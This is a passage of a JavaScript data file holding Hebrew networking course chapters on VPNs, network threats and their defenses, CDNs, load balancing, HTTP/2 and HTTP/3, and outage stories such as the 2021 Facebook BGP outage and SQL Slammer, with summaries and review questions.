            <li><strong>IKEv2</strong> (מועדף) – יעיל יותר, NAT Traversal מובנה (UDP 4500), תמיכה ב-MOBIKE לrerouting</li>
          </ul>
          <p>הצפנה: AES-256-GCM. Authentication: HMAC-SHA256. Key Exchange: Diffie-Hellman (DH group 14 = 2048bit, או 19/20 = ECDH).</p>
        `
      },
      {
        type: "explanation",
        title: "WireGuard – VPN מודרני ומינימליסטי",
        content: `
          <p><strong>WireGuard</strong> – פרוטוקול VPN מודרני. ~4,000 שורות קוד (vs. OpenVPN ~600,000). מובנה ב-Linux kernel מגרסה 5.6.</p>
          <p><strong>עקרונות:</strong></p>
          <ul>
            <li><strong>UDP בלבד</strong> – אין overhead של TCP. מתחבר מחדש שקטית אחרי שינוי רשת (רואמינג)</li>
            <li><strong>Cryptography קבוע</strong> – אין negotiation, אין cipher agility: תמיד Curve25519 (ECDH) + ChaCha20-Poly1305 + BLAKE2s</li>
            <li><strong>Public/Private Keys</strong> – אין certificates, אין PKI. כל peer מוגדר ע"י מפתח ציבורי</li>
            <li><strong>Cryptokey Routing</strong> – כל peer מוגדר עם allowed-IPs: "רשת X מגיעה דרך peer Y"</li>
          </ul>
          <div class="code-preview">
            <pre><code># /etc/wireguard/wg0.conf
[Interface]
PrivateKey = &lt;מפתח פרטי&gt;
Address = 10.0.0.1/24
ListenPort = 51820

[Peer]
PublicKey = &lt;מפתח ציבורי של peer&gt;
AllowedIPs = 10.0.0.2/32
Endpoint = peer.example.com:51820</code></pre>
          </div>
          <p><strong>ביצועים:</strong> WireGuard מהיר ב-50–100% מ-OpenVPN, קרוב ל-IPsec. מצוין ל-mobile (reconnect אחרי WiFi↔Cellular מהיר וחלק).</p>
        `
      },
      {
        type: "explanation",
        title: "OpenVPN ו-Split Tunneling",
        content: `
          <p><strong>OpenVPN</strong> – VPN מבוסס TLS. עובד על TCP 443 או UDP 1194. עובר בקלות דרך Firewalls (443 = HTTPS רגיל).</p>
          <p><strong>Full Tunnel vs Split Tunneling:</strong></p>
          <table class="content-table">
            <tr><th></th><th>Full Tunnel</th><th>Split Tunnel</th></tr>
            <tr><td>תעבורה</td><td>הכל דרך VPN</td><td>רק תעבורה ארגונית דרך VPN</td></tr>
            <tr><td>אינטרנט</td><td>דרך VPN Gateway</td><td>ישירות מהלקוח</td></tr>
            <tr><td>אבטחה</td><td>גבוהה – הכל מפוקח</td><td>נמוכה – אינטרנט לא עובר Firewall</td></tr>
            <tr><td>עומס VPN</td><td>גבוה</td><td>נמוך</td></tr>
            <tr><td>ביצועים</td><td>איטי לאינטרנט</td><td>מהיר לאינטרנט</td></tr>
          </table>
          <p><strong>VPN לפרטיות (צרכן)</strong>: ProtonVPN, Mullvad – מנתבים תעבורה דרך שרת שלהם. ה-ISP רואה חיבור ל-VPN Server, לא לאתרים. <strong>אבל:</strong> עכשיו ספק ה-VPN רואה הכל. לא קסם – אמון מועבר.</p>
        `
      },
      {
        type: "explanation",
        title: "אבטחת רשת – איומים נפוצים",
        content: `
          <p><strong>ARP Spoofing / ARP Poisoning</strong>: תוקף שולח ARP Reply מזויף: "אני ה-gateway – MAC שלי הוא XX:XX". כל התעבורה מופנית אליו (MITM). מניעה: Dynamic ARP Inspection ב-Switch, ARP Cache כתובות קריטיות סטטיות.</p>
          <p><strong>DNS Spoofing / Cache Poisoning</strong>: תוקף מזהם cache של DNS Resolver עם תשובה מזויפת. כל מי שמסתמך על ה-Resolver מנותב לשרת פישינג. מניעה: DNSSEC.</p>
          <p><strong>DoS / DDoS</strong>: הצפת שרת/רשת בתעבורה לגרום לה"פילה". SYN Flood: שולח אינסוף SYN ללא ACK – שרת מחזיק state לכל אחד. מניעה: SYN Cookies, rate limiting, CDN+Anycast.</p>
          <p><strong>Port Scanning</strong>: nmap שולח SYN לכל הפורטים ומזהה פורטים פתוחים. חלק מכל penetration test. הגנה: Firewall עם default-deny + ידוע מינימום פורטים פתוחים.</p>
          <p><strong>Man-in-the-Middle (MITM)</strong>: תוקף בין שני צדדים. HTTPS + Certificate Pinning מגן. HSTS (HTTP Strict Transport Security) מונע downgrade ל-HTTP.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – VPN ואבטחה",
        intro: "<p>אמת ושקר על VPN ואבטחת רשת:</p>",
        blocks: [
          {
            title: "VPN לא עושה אותך 'אנונימי'",
            icon: "🕵️",
            content: `<p>VPN מסתיר את ה-IP שלך מהאתר – אבל: הדפדפן שולח Fingerprint (גודל מסך, fonts, browser version, WebRTC IP), cookies עוקבים, חשבון Google/Facebook יודע מי את. ספק ה-VPN עצמו יכול לדעת. <strong>אנונימיות אמיתית</strong> = Tor + תרגולים נוספים. VPN = עוד שכבה פרטיות, לא כסות מושלמת.</p>`
          },
          {
            title: "Zero Trust – האמן לאף אחד",
            icon: "🔐",
            content: `<p><strong>Zero Trust Architecture</strong> – הגישה המודרנית: "לעולם אל תאמין, תמיד אמת". בניגוד לחשיבה "VPN פנימה = מהימן" – ב-Zero Trust כל בקשה נאמת מחדש: identity, device health, context. כל מיקרו-שירות מגן על עצמו. Google BeyondCorp (2011) הייתה פורצת דרך – עובד מסביב לעולם בלי VPN ארגוני, הכל מבוסס identity.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 21",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>VPN = מנהרה מוצפנת. Remote Access (עובד מהבית), Site-to-Site (בין משרדים)</li>
              <li>IPsec: ESP (הצפנה + אימות), Tunnel mode (כל הפקטה עטופה). IKEv2 מועדף</li>
              <li>WireGuard: מינימליסטי, מהיר, UDP, keys בלבד. Kernel-native ב-Linux</li>
              <li>Split Tunneling: רק רשת ארגונית דרך VPN. Full Tunnel: הכל</li>
              <li>איומים: ARP Spoofing, DNS Poisoning, SYN Flood, Port Scanning, MITM</li>
              <li>Zero Trust = אל תאמין, תמיד אמת. גם אחרי כניסה לרשת הארגונית</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 21",
        questions: [
          {
            q: "מה ההבדל בין IPsec Tunnel mode ל-Transport mode?",
            a: "Transport mode: מוצפן רק ה-payload, IP Header המקורי גלוי. לתקשורת Host-to-Host. Tunnel mode: כל הפקטה המקורית (כולל IP Header) נעטפת בפקטה חדשה עם IP של ה-Gateway. לVPN Site-to-Site."
          },
          {
            q: "למה WireGuard בוחרת cryptography קבוע ולא negotiable?",
            a: "Cipher agility = יותר קוד, יותר surface להתקפה, ניתן לכפות downgrade לאלגוריתם חלש. WireGuard בוחר: אנחנו משתמשים בChaCha20+Curve25519 כי הם הכי טובים היום. פחות קוד = פחות bugs. נקרא Cryptographic Opinionation."
          },
          {
            q: "מה SYN Flood ואיך SYN Cookies פותר?",
            a: "SYN Flood: תוקף שולח מיליוני SYN עם IP מזויף. שרת מקצה state לכל SYN ועומד להיחנק. SYN Cookies: שרת לא מקצה state – במקום זאת מחזיר SYN-ACK עם ISN שמוצפן מה-IP/Port/timestamp. רק ACK תקין מוכיח שהלקוח אמיתי."
          }
        ]
      }
    ]
  },
  {
    id: 22,
    title: "ארכיטקטורת אינטרנט מודרנית – CDN, Load Balancer, HTTP/2",
    pages: [
      {
        type: "explanation",
        title: "CDN – רשת הפצת תוכן",
        content: `
          <p>כשגולשים ל-Netflix מישראל – הסרטון לא מגיע מאמריקה כל פעם. <strong>CDN</strong> (Content Delivery Network) = רשת שרתי "קצה" מפוזרת גלובלית שמגישה תוכן ממקום קרוב.</p>
          <div class="diagram-container">
            <svg viewBox="0 0 340 120" class="content-diagram">
              <circle cx="170" cy="60" r="25" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="2"/>
              <text x="170" y="57" text-anchor="middle" font-size="9">Origin</text>
              <text x="170" y="70" text-anchor="middle" font-size="9">Server</text>
              <circle cx="60" cy="30" r="18" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.7"/>
              <text x="60" y="27" text-anchor="middle" font-size="8" fill="white">PoP</text>
              <text x="60" y="40" text-anchor="middle" font-size="7" fill="white">ת"א</text>
              <circle cx="290" cy="30" r="18" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.7"/>
              <text x="290" y="27" text-anchor="middle" font-size="8" fill="white">PoP</text>
              <text x="290" y="40" text-anchor="middle" font-size="7" fill="white">NY</text>
              <circle cx="60" cy="95" r="18" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.7"/>
              <text x="60" y="92" text-anchor="middle" font-size="8" fill="white">PoP</text>
              <text x="60" y="105" text-anchor="middle" font-size="7" fill="white">טוקיו</text>
              <circle cx="290" cy="95" r="18" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.7"/>
              <text x="290" y="92" text-anchor="middle" font-size="8" fill="white">PoP</text>
              <text x="290" y="105" text-anchor="middle" font-size="7" fill="white">לונדון</text>
              <line x1="145" y1="60" x2="78" y2="35" stroke="var(--accent)" stroke-dasharray="4,3"/>
              <line x1="195" y1="60" x2="272" y2="35" stroke="var(--accent)" stroke-dasharray="4,3"/>
              <line x1="145" y1="65" x2="78" y2="90" stroke="var(--accent)" stroke-dasharray="4,3"/>
              <line x1="195" y1="65" x2="272" y2="90" stroke="var(--accent)" stroke-dasharray="4,3"/>
            </svg>
            <p class="diagram-caption">CDN: Origin אחד + PoPs גלובליים. משתמש מקבל מה-PoP הקרוב</p>
          </div>
          <p><strong>איך CDN עובד:</strong></p>
          <ol>
            <li>DNS מחזיר IP של PoP הקרוב (via Anycast)</li>
            <li>PoP בודק cache: Cache HIT → מגיש מיידית (~5ms) ; Cache MISS → מביא מ-Origin → שומר → מגיש</li>
            <li>תוכן סטטי (תמונות, JS, CSS) – נשמר זמן רב. תוכן דינמי – עובר ישר ל-Origin (או cached לזמן קצר)</li>
          </ol>
          <p>CDN גדולים: Cloudflare (300+ PoPs), Akamai (4,000+ PoPs), AWS CloudFront, Fastly.</p>
          <p><strong>יתרונות נוספים:</strong> TLS termination בקצה (Handshake קרוב), DDoS mitigation (Anycast מפזר), HTTP/2 ו-HTTP/3 בקצה גם אם Origin ישן.</p>
        `
      },
      {
        type: "explanation",
        title: "Load Balancer – פיזור עומס",
        content: `
          <p><strong>Load Balancer</strong> מקבל בקשות ומפנה לאחד מכמה שרתים. מאפשר Scale-out (הוספת שרתים) ו-High Availability (שרת נפל? הבקשה הולכת לאחר).</p>
          <p><strong>אלגוריתמי Balancing:</strong></p>
          <table class="content-table">
            <tr><th>אלגוריתם</th><th>הגיון</th><th>מתאים ל</th></tr>
            <tr><td>Round Robin</td><td>בתור מחזורי</td><td>בקשות שוות זמן עיבוד</td></tr>
            <tr><td>Least Connections</td><td>לשרת עם הכי פחות חיבורים פעילים</td><td>בקשות שונות זמן עיבוד</td></tr>
            <tr><td>IP Hash</td><td>hash(client_IP) → תמיד אותו שרת</td><td>Session affinity (עגינה)</td></tr>
            <tr><td>Weighted</td><td>שרתים חזקים מקבלים יותר</td><td>שרתים בסיסי חומרה שונה</td></tr>
          </table>
          <p><strong>שכבות:</strong></p>
          <ul>
            <li><strong>L4 Load Balancer</strong> – פועל על TCP/UDP. מהיר, אבל לא "רואה" HTTP. לא יכול לנתב לפי URL</li>
            <li><strong>L7 Load Balancer</strong> – מבין HTTP. יכול לנתב לפי path: <code>/api</code> → שרתי API, <code>/static</code> → שרתי CDN. מאפשר SSL termination, header injection, health checks</li>
          </ul>
          <p><strong>Health Checks</strong>: Load Balancer שולח בקשות בדיקה לכל שרת. שרת שלא עונה – מוצא ממחזור. HA (High Availability) = HA Pair של Load Balancers (Primary + Standby) עם failover אוטומטי.</p>
        `
      },
      {
        type: "explanation",
        title: "HTTP/2 ו-HTTP/3 – הדורות הבאים",
        content: `
          <p><strong>HTTP/1.1</strong> (1997): בקשה-תגובה. חיבור אחד = בקשה אחת. Head-of-Line Blocking (HOL): בקשה תקועה בלוקת הבאות.</p>
          <p><strong>HTTP/2</strong> (2015) – שיפורים:</p>
          <ul>
            <li><strong>Multiplexing</strong> – כמה בקשות על חיבור TCP אחד בו-זמנית. פותר HOL blocking ב-Application layer</li>
            <li><strong>Binary Protocol</strong> – לא טקסט. יעיל יותר לניתוח</li>
            <li><strong>Header Compression (HPACK)</strong> – Headers חוזרים נשלחים רק פעם אחת</li>
            <li><strong>Server Push</strong> – שרת יכול לשלוח resources לפני שהלקוח ביקש (CSS יחד עם HTML)</li>
            <li><strong>Stream Priority</strong> – בקשות ניתנות לתעדוף</li>
          </ul>
          <p><strong>HTTP/3</strong> (2022) – מעל QUIC (UDP):</p>
          <ul>
            <li><strong>QUIC</strong> – UDP עם congestion control + TLS 1.3 מובנה. 0-RTT Handshake</li>
            <li><strong>אין HOL Blocking גם ב-TCP level</strong> – כל stream עצמאי. ב-HTTP/2 אם TCP חבילה אבדה – כל הstreams תקועים</li>
            <li><strong>Connection Migration</strong> – Connection ID (לא IP:Port). WiFi → Cellular ללא ניתוק</li>
          </ul>
          <p>כ-60% מתעבורת YouTube היא HTTP/3. Cloudflare, Google, Facebook – כולם HTTP/3.</p>
        `
      },
      {
        type: "explanation",
        title: "REST API ו-WebSockets",
        content: `
          <p><strong>REST API</strong> (Representational State Transfer) – ארכיטקטורת API על HTTP. כל משאב = URL. פעולות = HTTP Methods:</p>
          <table class="content-table">
            <tr><th>Method</th><th>פעולה</th><th>דוגמה</th></tr>
            <tr><td>GET</td><td>קריאה</td><td>GET /users/42 → פרטי משתמש</td></tr>
            <tr><td>POST</td><td>יצירה</td><td>POST /users → משתמש חדש</td></tr>
            <tr><td>PUT</td><td>עדכון מלא</td><td>PUT /users/42 → החלפה מלאה</td></tr>
            <tr><td>PATCH</td><td>עדכון חלקי</td><td>PATCH /users/42 → שינוי שדה</td></tr>
            <tr><td>DELETE</td><td>מחיקה</td><td>DELETE /users/42</td></tr>
          </table>
          <p>Response בדרך כלל JSON. Status codes: 200 (OK), 201 (Created), 400 (Bad Request), 401 (Unauthorized), 403 (Forbidden), 404 (Not Found), 500 (Server Error).</p>
          <p><strong>WebSockets</strong> – חיבור דו-כיווני מתמשך מעל HTTP. Upgrade request: HTTP → WebSocket. אחרי Upgrade – ניתן לשלוח ולקבל בחופשיות ללא Request-Response overhead. מתאים ל: Chat, Real-time games, Trading, Live dashboards.</p>
          <div class="code-preview">
            <pre><code>// לקוח WebSocket בJavaScript
const ws = new WebSocket('wss://chat.example.com/ws')
ws.onopen = () => ws.send(JSON.stringify({msg: 'שלום!'}))
ws.onmessage = (e) => console.log(JSON.parse(e.data))</code></pre>
          </div>
        `
      },
      {
        type: "explanation",
        title: "Microservices ו-Service Mesh",
        content: `
          <p><strong>Monolith vs Microservices</strong>: יישום מונוליטי = הכל בקוד אחד. Microservices = כל פיצ'ר הוא שירות עצמאי שמתקשר דרך HTTP/gRPC.</p>
          <div class="diagram-container">
            <svg viewBox="0 0 340 100" class="content-diagram">
              <rect x="10" y="20" width="100" height="60" rx="6" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="60" y="50" text-anchor="middle" font-size="10">Monolith</text>
              <text x="60" y="64" text-anchor="middle" font-size="8" fill="var(--text-muted)">All-in-one</text>
              <rect x="160" y="10" width="50" height="30" rx="4" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.7"/>
              <text x="185" y="29" text-anchor="middle" font-size="8" fill="white">Users</text>
              <rect x="220" y="10" width="50" height="30" rx="4" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.7"/>
              <text x="245" y="29" text-anchor="middle" font-size="8" fill="white">Orders</text>
              <rect x="280" y="10" width="50" height="30" rx="4" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.7"/>
              <text x="305" y="29" text-anchor="middle" font-size="8" fill="white">Pay</text>
              <rect x="160" y="60" width="50" height="30" rx="4" fill="var(--accent-gold)" stroke="var(--accent-gold)" opacity="0.7"/>
              <text x="185" y="78" text-anchor="middle" font-size="8">Catalog</text>
              <rect x="220" y="60" width="50" height="30" rx="4" fill="var(--accent-gold)" stroke="var(--accent-gold)" opacity="0.7"/>
              <text x="245" y="78" text-anchor="middle" font-size="8">Notify</text>
              <rect x="280" y="60" width="50" height="30" rx="4" fill="var(--accent-gold)" stroke="var(--accent-gold)" opacity="0.7"/>
              <text x="305" y="78" text-anchor="middle" font-size="8">Search</text>
            </svg>
          </div>
          <p><strong>Service Mesh</strong> (Istio, Linkerd): ב-microservices, כל שירות מדבר עם עשרות אחרים. Service Mesh = sidecar proxy ליד כל שירות שמטפל ב-TLS, load balancing, circuit breaking, tracing – ללא שינוי בקוד.</p>
          <p><strong>API Gateway</strong>: נקודת כניסה אחת לכל ה-microservices. מטפל ב-Auth, rate limiting, routing, logging. גרסאות: AWS API Gateway, Kong, Nginx.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – ארכיטקטורה מודרנית",
        intro: "<p>כיצד האינטרנט ממש עובד בגדול:</p>",
        blocks: [
          {
            title: "Anycast – אותה כתובת, מיקומים שונים",
            icon: "🗺️",
            content: `<p>Anycast = אותה IP ב-BGP מכמה מקומות בעולם. הרשת מנתבת ל-PoP הקרוב. 1.1.1.1 של Cloudflare = אותה IP ב-300+ מקומות. Cloudflare משתמש בזה גם לDDoS mitigation: 1Tbps DDoS מתחלק בין 300 PoPs → כל PoP מקבל רק 3Gbps → לא בעיה. זאת למה CDN ורשתות כמו Cloudflare "לא נופלות" גם בהתקפות ענק.</p>`
          },
          {
            title: "Edge Computing – חישוב ב-PoP",
            icon: "⚡",
            content: `<p>PoPs של CDN הם לא רק Cache. <strong>Edge Computing</strong> = הרצת קוד ב-edge node הקרוב למשתמש. Cloudflare Workers, AWS Lambda@Edge – פונקציות שרצות ב-100ms latency ממשתמש, לא 150ms. פותח שוק חדש: real-time personalization, A/B testing, authentication – הכל ב-edge ללא latency של round-trip ל-origin.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 22",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>CDN: PoPs גלובליים + Anycast. Cache HIT = מהיר. Cache MISS = מ-Origin. מגן מ-DDoS</li>
              <li>Load Balancer: L4 (TCP) / L7 (HTTP). Round Robin, Least Connections, IP Hash. Health Checks</li>
              <li>HTTP/2: Multiplexing, Binary, HPACK, Server Push. HTTP/3: QUIC (UDP), 0-RTT, Connection Migration</li>
              <li>REST: GET/POST/PUT/PATCH/DELETE על URLs. JSON. WebSockets: חיבור דו-כיווני מתמשך</li>
              <li>Microservices: שירותים עצמאיים. Service Mesh: sidecar proxy. API Gateway: כניסה אחת</li>
              <li>Anycast = אותה IP במקומות רבים. Edge Computing = קוד ב-PoP הקרוב</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 22",
        questions: [
          {
            q: "מה ההבדל בין Cache HIT ל-Cache MISS ב-CDN?",
            a: "Cache HIT: הקובץ המבוקש קיים ב-PoP הקרוב ועדיין בתוקף → מוגש מיידית (5–15ms). Cache MISS: הקובץ לא ב-PoP → PoP מביא מ-Origin Server (~150ms) → שומר ב-cache → מגיש. לבקשות הבאות לאותו PoP → HIT."
          },
          {
            q: "מה הפתרון של HTTP/3 לבעיה של HTTP/2?",
            a: "HTTP/2 עם Multiplexing פתר HOL Blocking ב-Application Layer – אבל TCP עדיין בעיה: חבילה אחת אבודה = כל ה-streams מחכים (HOL Blocking ברמת TCP). HTTP/3 מעל QUIC (UDP): כל stream עצמאי גם ב-transport layer. אובדן חבילה = רק stream אחד מושפע."
          },
          {
            q: "מתי WebSockets עדיפים על REST API רגיל?",
            a: "REST = Request-Response. כל עדכון = round-trip. לתוכן שמשתנה תכופות (chat, game, trading, live dashboard) – polling = overhead עצום. WebSocket = חיבור פתוח. שרת שולח עדכון מיידי ללא שהלקוח יבקש. כשצריך real-time עם latency מינימלי."
          }
        ]
      }
    ]
  },
  {
    id: 23,
    title: "כשל ואיתחול – סיפורי קריסות אינטרנט",
    pages: [
      {
        type: "explanation",
        title: "פייסבוק נפלה – 6 שעות של BGP כאוס",
        content: `
          <p><strong>4 באוקטובר 2021, 15:51 UTC.</strong> פייסבוק, אינסטגרם, ווטסאפ — כולם נעלמו מהאינטרנט בו-זמנית. 3.5 מיליארד משתמשים. 6 שעות.</p>
          <p>מה קרה? בצעד תחזוקה שגרתי, מהנדס שינה הגדרות ב-BGP router. הפקודה השגויה <strong>ביטלה את כל ה-prefix announcements</strong> — פייסבוק פשוט "הסירה את עצמה" ממפת האינטרנט.</p>
          <div class="diagram-container">
            <svg viewBox="0 0 380 130" class="content-diagram">
              <rect x="10" y="10" width="80" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="50" y="31" text-anchor="middle" font-size="9">ISP / רשת עולמית</text>
              <rect x="150" y="10" width="80" height="35" rx="4" fill="#fee2e2" stroke="#f87171"/>
              <text x="190" y="26" text-anchor="middle" font-size="9" fill="#dc2626">Facebook BGP</text>
              <text x="190" y="38" text-anchor="middle" font-size="8" fill="#dc2626">WITHDREW ALL</text>
              <rect x="290" y="10" width="80" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="330" y="31" text-anchor="middle" font-size="9">משתמשים</text>
              <line x1="90" y1="27" x2="148" y2="27" stroke="#f87171" stroke-width="2" stroke-dasharray="5,3"/>
              <text x="119" y="22" text-anchor="middle" font-size="8" fill="#dc2626">✗</text>
              <line x1="232" y1="27" x2="288" y2="27" stroke="#f87171" stroke-width="2" stroke-dasharray="5,3"/>
              <text x="260" y="22" text-anchor="middle" font-size="8" fill="#dc2626">✗</text>
              <rect x="60" y="65" width="260" height="55" rx="6" fill="#fef3c7" stroke="#f59e0b"/>
              <text x="190" y="82" text-anchor="middle" font-size="10" font-weight="bold" fill="#92400e">השלכות הקריסה</text>
              <text x="190" y="96" text-anchor="middle" font-size="8" fill="#92400e">• DNS של facebook.com לא ענה (השרתים גם הם בתוך הרשת)</text>
              <text x="190" y="108" text-anchor="middle" font-size="8" fill="#92400e">• עובדי פייסבוק לא יכלו להתחבר מרחוק לתקן</text>
              <text x="190" y="120" text-anchor="middle" font-size="8" fill="#92400e">• הפסד: ~$60M הכנסות + $6B ירידה בשווי מניה</text>
            </svg>
          </div>
          <p><strong>הבעיה העמוקה:</strong> הכלים לתיקון גם הם היו <em>בתוך</em> הרשת שנפלה. מהנדסים נאלצו לנסוע פיזית למרכז הנתונים ולהיכנס עם badge שלא עבד כי מערכת הגישה גם היא תלויה בפייסבוק.</p>
          <p><strong>BGP — Border Gateway Protocol</strong>: הפרוטוקול שמנהל את "מפת האינטרנט". כל AS (Autonomous System) — חברה, ספקית אינטרנט, מדינה — מכריז על ה-prefixes שלה. בלי הכרזות? אף אחד לא יודע איפה פייסבוק.</p>
        `
      },
      {
        type: "explanation",
        title: "SQL Slammer – 376 בתים ששיתקו את האינטרנט",
        content: `
          <p><strong>25 בינואר 2003, 05:30 UTC.</strong> תוך 10 דקות, 75,000 שרתים נדבקו. תוך 30 דקות — אינטרנט של דרום קוריאה קרס לחלוטין.</p>
          <p><strong>הנשק:</strong> червь (תולעת) בגודל 376 בתים בלבד. קטן מספיק להיכנס בחבילת UDP אחת. ניצלה חולשה ידועה ב-Microsoft SQL Server — שכבר קיים לה patch מזה 6 חודשים.</p>
          <div class="diagram-container">
            <svg viewBox="0 0 360 110" class="content-diagram">
              <circle cx="180" cy="55" r="8" fill="#dc2626"/>
              <text x="180" y="59" text-anchor="middle" font-size="7" fill="white">0</text>
              <text x="180" y="75" text-anchor="middle" font-size="8">שרת נגוע</text>
              <g opacity="0.8">
                <circle cx="80" cy="30" r="6" fill="#f87171"/>
                <circle cx="280" cy="30" r="6" fill="#f87171"/>
                <circle cx="80" cy="80" r="6" fill="#f87171"/>
                <circle cx="280" cy="80" r="6" fill="#f87171"/>
                <circle cx="130" cy="15" r="5" fill="#fca5a5"/>
                <circle cx="230" cy="15" r="5" fill="#fca5a5"/>
                <circle cx="50" cy="55" r="5" fill="#fca5a5"/>
                <circle cx="310" cy="55" r="5" fill="#fca5a5"/>
              </g>
              <line x1="180" y1="47" x2="85" y2="33" stroke="#f87171" stroke-width="1.5" opacity="0.6"/>
              <line x1="180" y1="47" x2="275" y2="33" stroke="#f87171" stroke-width="1.5" opacity="0.6"/>
              <line x1="180" y1="63" x2="85" y2="77" stroke="#f87171" stroke-width="1.5" opacity="0.6"/>
              <line x1="180" y1="63" x2="275" y2="77" stroke="#f87171" stroke-width="1.5" opacity="0.6"/>
              <text x="180" y="103" text-anchor="middle" font-size="8" fill="var(--text-muted)">כל שרת נגוע שולח לאלפי IP אקראיים — גדילה אקספוננציאלית</text>
            </svg>
          </div>
          <p><strong>מה עשתה התולעת?</strong></p>
          <ul>
            <li>נכנסה דרך פורט UDP 1434 (SQL Server Resolution Service)</li>
            <li>העתיקה את עצמה לזיכרון — <strong>לא לדיסק</strong>. ב-reboot — נעלמת</li>
            <li>שלחה עותקים לכתובות IP אקראיות במהירות מקסימלית</li>
            <li>כל שרת שלח UDP packets במהירות של network card — עד 50Mpps</li>
          </ul>
          <p><strong>הלקח:</strong> patch management. חולשה ידועה, patch זמין, אף אחד לא עדכן. בדיוק אותו תסריט קרה ב-2017 עם WannaCry.</p>
        `
      },
      {
        type: "explanation",
        title: "BGP Leaks – כשהניתוב הולך לאיבוד",
        content: `
          <p>BGP hijacking ו-BGP leaks הם בין האיומים הפחות מוכרים — ומסוכנים — לאינטרנט. <strong>BGP אין בו authentication מובנה</strong>. כל AS יכול להכריז על כל prefix. בטעות או בכוונה.</p>
          <p><strong>2010 — China Telecom מנתב 15% מהאינטרנט דרך סין:</strong></p>
          <ul>
            <li>China Telecom הכריזה בטעות על ~50,000 prefixes — כולל כאלה של Dell, IBM, CNN, Army.mil</li>
            <li>18 דקות — תנועה מרחבי העולם עברה דרך סין</li>
            <li>המידע לא היה מוצפן. כל מי ששלט ב-routers יכל לקרוא</li>
          </ul>
          <p><strong>2019 — Cloudflare, Comcast, AWS מנותבים דרך ניגריה:</strong></p>
          <ul>
            <li>MainOne (ISP ניגרי) דלף routing ל-MTN ניגריה, שדלפה ל-China Telecom</li>
            <li>שעה וחצי של תנועה מסוננת</li>
          </ul>
          <div class="diagram-container">
            <svg viewBox="0 0 360 90" class="content-diagram">
              <rect x="10" y="25" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="45" y="48" text-anchor="middle" font-size="9">משתמש</text>
              <rect x="280" y="25" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="315" y="45" text-anchor="middle" font-size="9">Google</text>
              <text x="315" y="57" text-anchor="middle" font-size="8">8.8.8.8</text>
              <rect x="140" y="5" width="80" height="35" rx="4" fill="#fee2e2" stroke="#f87171"/>
              <text x="180" y="20" text-anchor="middle" font-size="9" fill="#dc2626">🇨🇳 China Telecom</text>
              <text x="180" y="32" text-anchor="middle" font-size="8" fill="#dc2626">"אני מכיר 8.8.8.8"</text>
              <path d="M 80 45 Q 180 80 280 45" stroke="var(--accent-green)" stroke-width="2" fill="none" stroke-dasharray="6,3"/>
              <text x="180" y="82" text-anchor="middle" font-size="8" fill="var(--text-muted)">מסלול תקין (BGP)</text>
              <path d="M 80 42 L 142 22" stroke="#f87171" stroke-width="2" fill="none"/>
              <path d="M 218 22 L 280 42" stroke="#f87171" stroke-width="2" fill="none"/>
              <text x="180" y="18" text-anchor="middle" font-size="8" fill="#dc2626">מסלול שנחטף</text>
            </svg>
          </div>
          <p><strong>הפתרון: RPKI</strong> (Resource Public Key Infrastructure) — מאפשר לבעלי IP לחתום קריפטוגרפית על הכרזות ה-BGP שלהם. אימוץ הולך וגדל אבל עדיין חלקי. האינטרנט עדיין פגיע.</p>
        `
      },
      {
        type: "explanation",
        title: "Postmortem – תרבות הלמידה מכשלים",
        content: `
          <p>בחברות הטכנולוגיה הגדולות — Google, Amazon, Netflix, Cloudflare — כשל הוא <strong>הזדמנות ללמוד</strong>, לא סיבה לפטר מישהו. זה נקרא "blameless postmortem culture".</p>
          <p><strong>מבנה הפוסטמורטם:</strong></p>
          <ul>
            <li><strong>Timeline:</strong> מה קרה בדיוק, מתי, מי הבחין ראשון</li>
            <li><strong>Root Cause Analysis:</strong> 5 Why's — מחפשים את הסיבה העמוקה, לא הסימפטום</li>
            <li><strong>Impact:</strong> כמה משתמשים הושפעו, כמה הכנסות אבדו, SLA</li>
            <li><strong>Action Items:</strong> מה נשנה — תהליך, קוד, מוניטורינג</li>
            <li><strong>Prevention:</strong> איך למנוע הישנות</li>
          </ul>
          <div class="code-preview">
            <pre><code>Postmortem: Database Outage — 2024-03-15
Severity: P0 | Duration: 47 minutes
Impact: 2.3M users, $180K revenue loss

Timeline:
14:23 — Deploy of config change (auto-approved)
14:24 — Error rate spikes to 45%
14:31 — On-call paged
14:51 — Root cause found: missing index on new column
15:10 — Rollback deployed, recovery complete

Root Cause: config change added query without index review.
5 Why: Why no index? → wasn't in schema migration.
Why not? → code review checklist didn't include DB review.</code></pre>
          </div>
          <p><strong>Google SRE Book:</strong> "If a human operator needs to touch your system during normal operations, you have a bug." — זה הסטנדרט שגוגל בנתה את אמינות שירותיה עליו.</p>
          <p><strong>Error Budget:</strong> SLA של 99.9% = מותר 8.7 שעות downtime לשנה. גוגל מתירה לעצמה לנצל את ה-budget הזה — כי אם לא תסתכן, לא תחדש.</p>
        `
      },
      {
        type: "explanation",
        title: "Chaos Engineering – שוברים בכוונה",
        content: `
          <p><strong>Netflix, 2011:</strong> "מה יקרה אם שרת ייפול אקראי בproduction?" במקום לחשוב — הם ניסו. נולד <strong>Chaos Monkey</strong>.</p>
